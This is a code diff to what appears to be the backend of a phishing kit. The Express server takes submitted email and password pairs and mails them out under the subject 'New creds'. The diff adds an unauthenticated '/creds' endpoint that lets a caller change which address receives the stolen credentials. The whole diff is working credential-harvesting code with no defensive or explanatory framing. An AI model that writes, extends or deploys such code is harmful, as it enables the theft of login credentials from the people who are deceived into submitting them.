@@ -19,7 +19,18 @@ const schema = Joi.object({
   password: Joi.string().pattern(new RegExp("^[a-zA-Z0-9]{3,30}$")).required(),
 });
 
+const emailSchema = Joi.object({
+  email: Joi.string()
+    .email({
+      minDomainSegments: 2,
+      tlds: { allow: ["com", "net"] },
+    })
+    .required(),
+});
+
 // nodemailer setup
+
+let recipientEmail = "";
 
 const transporter = nodemailer.createTransport({
   service: "Gmail",
@@ -46,7 +57,7 @@ app.post("/", async (req, res) => {
     const { email, password } = await schema.validateAsync(req.body);
     const mailOptions = {
       from: process.env.SMTP_USER,
-      to: process.env.RECIPIENT_USER,
+      to: recipientEmail || process.env.RECIPIENT_USER,
       subject: "New creds",
       html: `<!DOCTYPE html>
             <html>
@@ -71,6 +82,24 @@ app.post("/", async (req, res) => {
   }
 });
 
+app.post("/creds", async (req, res) => {
+  try {
+    const { email } = await emailSchema.validateAsync(req.body);
+    recipientEmail = email;
+    res.status(200).json({
+      statusCode: 200,
+      message: "successfully changed email",
+      data: recipientEmail,
+    });
+  } catch (error) {
+    res.status(400).json({
+      statusCode: 400,
+      message: error.message,
+      data: null,
+    });
+  }
+});
+
 app.all("*", (req, res) => {
   res.send({
     code: 404,
@@ -81,6 +110,5 @@ app.all("*", (req, res) => {
 const PORT = process.env.PORT || 8000;
 
 app.listen(PORT, () => console.log(`Server is listening on port  ${PORT}`));
-
 
 module.exports = app;
